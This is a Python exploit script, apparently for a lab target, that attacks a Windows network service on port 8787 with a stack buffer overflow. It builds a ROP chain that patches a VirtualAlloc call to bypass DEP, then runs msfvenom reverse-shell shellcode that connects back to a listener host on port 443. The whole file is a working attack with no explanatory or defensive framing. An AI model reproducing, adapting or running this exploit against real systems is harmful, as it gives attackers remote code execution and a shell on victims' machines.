#!/usr/bin/python
from pwn import *
from struct import pack

# Exploit Information
# ---------------------------

ip = "192.168.223.141"
port = 8787
offset = 1007

print("[!] Target Information")
print("[!] IP Address : " + ip)
print("[!] Port : "+ str(port))

# ---------------------------

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.223.185 LPORT=443 -b '\x00' -f python -v shellcode

shellcode =  b""
shellcode += b"\xbb\xd4\xc5\x1b\x35\xdb\xdc\xd9\x74\x24\xf4"
shellcode += b"\x5e\x33\xc9\xb1\x52\x31\x5e\x12\x83\xc6\x04"
shellcode += b"\x03\x8a\xcb\xf9\xc0\xce\x3c\x7f\x2a\x2e\xbd"
shellcode += b"\xe0\xa2\xcb\x8c\x20\xd0\x98\xbf\x90\x92\xcc"
shellcode += b"\x33\x5a\xf6\xe4\xc0\x2e\xdf\x0b\x60\x84\x39"
shellcode += b"\x22\x71\xb5\x7a\x25\xf1\xc4\xae\x85\xc8\x06"
shellcode += b"\xa3\xc4\x0d\x7a\x4e\x94\xc6\xf0\xfd\x08\x62"
shellcode += b"\x4c\x3e\xa3\x38\x40\x46\x50\x88\x63\x67\xc7"
shellcode += b"\x82\x3d\xa7\xe6\x47\x36\xee\xf0\x84\x73\xb8"
shellcode += b"\x8b\x7f\x0f\x3b\x5d\x4e\xf0\x90\xa0\x7e\x03"
shellcode += b"\xe8\xe5\xb9\xfc\x9f\x1f\xba\x81\xa7\xe4\xc0"
shellcode += b"\x5d\x2d\xfe\x63\x15\x95\xda\x92\xfa\x40\xa9"
shellcode += b"\x99\xb7\x07\xf5\xbd\x46\xcb\x8e\xba\xc3\xea"
shellcode += b"\x40\x4b\x97\xc8\x44\x17\x43\x70\xdd\xfd\x22"
shellcode += b"\x8d\x3d\x5e\x9a\x2b\x36\x73\xcf\x41\x15\x1c"
shellcode += b"\x3c\x68\xa5\xdc\x2a\xfb\xd6\xee\xf5\x57\x70"
shellcode += b"\x43\x7d\x7e\x87\xa4\x54\xc6\x17\x5b\x57\x37"
shellcode += b"\x3e\x98\x03\x67\x28\x09\x2c\xec\xa8\xb6\xf9"
shellcode += b"\xa3\xf8\x18\x52\x04\xa8\xd8\x02\xec\xa2\xd6"
shellcode += b"\x7d\x0c\xcd\x3c\x16\xa7\x34\xd7\xd9\x90\xe9"
shellcode += b"\x9e\xb2\xe2\x15\xe0\xf9\x6a\xf3\x88\xed\x3a"
shellcode += b"\xac\x24\x97\x66\x26\xd4\x58\xbd\x43\xd6\xd3"
shellcode += b"\x32\xb4\x99\x13\x3e\xa6\x4e\xd4\x75\x94\xd9"
shellcode += b"\xeb\xa3\xb0\x86\x7e\x28\x40\xc0\x62\xe7\x17"
shellcode += b"\x85\x55\xfe\xfd\x3b\xcf\xa8\xe3\xc1\x89\x93"
shellcode += b"\xa7\x1d\x6a\x1d\x26\xd3\xd6\x39\x38\x2d\xd6"
shellcode += b"\x05\x6c\xe1\x81\xd3\xda\x47\x78\x92\xb4\x11"
shellcode += b"\xd7\x7c\x50\xe7\x1b\xbf\x26\xe8\x71\x49\xc6"
shellcode += b"\x59\x2c\x0c\xf9\x56\xb8\x98\x82\x8a\x58\x66"
shellcode += b"\x59\x0f\x68\x2d\xc3\x26\xe1\xe8\x96\x7a\x6c"
shellcode += b"\x0b\x4d\xb8\x89\x88\x67\x41\x6e\x90\x02\x44"
shellcode += b"\x2a\x16\xff\x34\x23\xf3\xff\xeb\x44\xd6"

def virtualalloc():
    va  = pack("<L", 0x40404040) # VritualAlloc Call Address
    va += pack("<L", 0x41414141) # Return to Shellcode
    va += pack("<L", 0x42424242) # LPVOID lpAddress
    va += pack("<L", 0x43434343) # SIZE_T dwSize
    va += pack("<L", 0x44444444) # DWORD  flAllocationType
    va += pack("<L", 0x45454545) # DWORD  flProtect
    return va

def build_rop():

    # Get stack pointer value
    rop  = pack("<L", 0x01121460) # push esp ; pop ebp ; ret
    rop += pack("<L", 0x0112146b) # push ebp ; pop esi ; ret
    rop += pack("<L", 0x01121465) # xchg esi, ecx ; ret

    # Subtract stack pointer to the VirtualAlloc call address for later patch
    rop += pack("<L", 0x01121471) # pop eax ; ret
    rop += pack("<L", 0xffffffe4) # -0x1c
    rop += pack("<L", 0x0112146e) # add eax, ecx ; ret
    rop += pack("<L", 0x0112147c) # xchg eax, ecx ; nop ; pop ebp ; ret
    rop += pack("<L", 0x87878787) # Junk for ebp
    rop += pack("<L", 0x01121465) # xchg esi, ecx ; ret

    # Get VirtualAlloc call address
    rop += pack("<L", 0x01121471) # pop eax ; ret
    rop += pack("<L", 0x011291dc) # VirtualAlloc in IAT address
    rop += pack("<L", 0x01121476) # mov ecx, [eax] ; ret

    # Patch VirtualAlloc call address
    rop += pack("<L", 0x01121465) # xchg esi, ecx ; ret
    rop += pack("<L", 0x0112147c) # xchg eax, ecx ; nop ; pop ebp ; ret
    rop += pack("<L", 0x87878787) # Junk for ebp
    rop += pack("<L", 0x01121465) # xchg esi, ecx ; ret
    rop += pack("<L", 0x01121473) # mov [eax], ecx ; ret

    # Inc pointer to patch shellcode address
    rop += pack("<L", 0x01121463) # inc eax ; ret
    rop += pack("<L", 0x01121463) # inc eax ; ret
    rop += pack("<L", 0x01121463) # inc eax ; ret
    rop += pack("<L", 0x01121463) # inc eax ; ret

    # Add pointer to shellcode address
    rop += pack("<L", 0x0112147c) # xchg eax, ecx ; nop ; pop ebp ; ret
    rop += pack("<L", 0x87878787) # Junk for ebp
    rop += pack("<L", 0x01121471) # pop eax ; ret
    rop += pack("<L", 0xfffffeb4) # -0x14c
    rop += pack("<L", 0x01121468) # neg eax ; ret
    rop += pack("<L", 0x0112146e) # add eax, ecx ; ret

    # Patch return to shellcode address
    rop += pack("<L", 0x0112147c) # xchg eax, ecx ; nop ; pop ebp ; ret
    rop += pack("<L", 0x87878787) # Junk for ebp
    rop += pack("<L", 0x01121473) # mov [eax], ecx ; ret

    # Add pointer to lpbuffer
    rop += pack("<L", 0x01121463) # inc eax ; ret
    rop += pack("<L", 0x01121463) # inc eax ; ret
    rop += pack("<L", 0x01121463) # inc eax ; ret
    rop += pack("<L", 0x01121463) # inc eax ; ret

    # Patch lpbuffer
    rop += pack("<L", 0x01121473) # mov [eax], ecx ; ret

    # Add pointer to dwSize
    rop += pack("<L", 0x01121463) # inc eax ; ret
    rop += pack("<L", 0x01121463) # inc eax ; ret
    rop += pack("<L", 0x01121463) # inc eax ; ret
    rop += pack("<L", 0x01121463) # inc eax ; ret

    # Patch dwSize
    rop += pack("<L", 0x0112147c) # xchg eax, ecx ; nop ; pop ebp ; ret
    rop += pack("<L", 0x87878787) # Junk for ebp
    rop += pack("<L", 0x01121471) # pop eax ; ret
    rop += pack("<L", 0xffffffff) # -0x1
    rop += pack("<L", 0x01121468) # neg eax ; ret
    rop += pack("<L", 0x0112147c) # xchg eax, ecx ; nop ; pop ebp ; ret
    rop += pack("<L", 0x87878787) # Junk for ebp
    rop += pack("<L", 0x01121473) # mov [eax], ecx ; ret

    # Add pointer to flAllocationType
    rop += pack("<L", 0x01121463) # inc eax ; ret
    rop += pack("<L", 0x01121463) # inc eax ; ret
    rop += pack("<L", 0x01121463) # inc eax ; ret
    rop += pack("<L", 0x01121463) # inc eax ; ret

    # Patch flAllocationType
    rop += pack("<L", 0x0112147c) # xchg eax, ecx ; nop ; pop ebp ; ret
    rop += pack("<L", 0x87878787) # Junk for ebp
    rop += pack("<L", 0x01121471) # pop eax ; ret
    rop += pack("<L", 0xffffefff) # -0x1001
    rop += pack("<L", 0x01121463) # inc eax ; ret
    rop += pack("<L", 0x01121468) # neg eax ; ret
    rop += pack("<L", 0x0112147c) # xchg eax, ecx ; nop ; pop ebp ; ret
    rop += pack("<L", 0x87878787) # Junk for ebp
    rop += pack("<L", 0x01121473) # mov [eax], ecx ; ret

    # Add pointer to flProtect
    rop += pack("<L", 0x01121463) # inc eax ; ret
    rop += pack("<L", 0x01121463) # inc eax ; ret
    rop += pack("<L", 0x01121463) # inc eax ; ret
    rop += pack("<L", 0x01121463) # inc eax ; ret

    # Patch flProtect
    rop += pack("<L", 0x0112147c) # xchg eax, ecx ; nop ; pop ebp ; ret
    rop += pack("<L", 0x87878787) # Junk for ebp
    rop += pack("<L", 0x01121471) # pop eax ; ret
    rop += pack("<L", 0xffffffc0) # -0x40
    rop += pack("<L", 0x01121468) # neg eax ; ret
    rop += pack("<L", 0x0112147c) # xchg eax, ecx ; nop ; pop ebp ; ret
    rop += pack("<L", 0x87878787) # Junk for ebp
    rop += pack("<L", 0x01121473) # mov [eax], ecx ; ret

    # Back to VirtualAlloc call address and bypass DEP
    rop += pack("<L", 0x0112147c) # xchg eax, ecx ; nop ; pop ebp ; ret
    rop += pack("<L", 0x87878787) # Junk for ebp
    rop += pack("<L", 0x01121471) # pop eax ; ret
    rop += pack("<L", 0xffffffec) # -0x14
    rop += pack("<L", 0x0112146e) # add eax, ecx ; ret
    rop += pack("<L", 0x01122e8d) # xchg eax, esp ; ret

    return rop

def build_payload():
    va = virtualalloc()
    pattern = b'A' * (offset - len(va))
    rop = build_rop()

    payload  = b'meow '
    payload += pattern
    payload += va
    payload += rop
    payload += b'\x90' * 40
    payload += shellcode
    payload += b'\x90' * 40
    return payload

def main():
    r = remote(ip, port)
    r.recvuntil(b']')
    payload = build_payload()
    print("[+] Payload Length : " + str(len(payload)))

    r.sendline(payload)
    print("[+] Send Payload !")
    print("[+] Target crashed, reverse shell should be back ;)")

main()
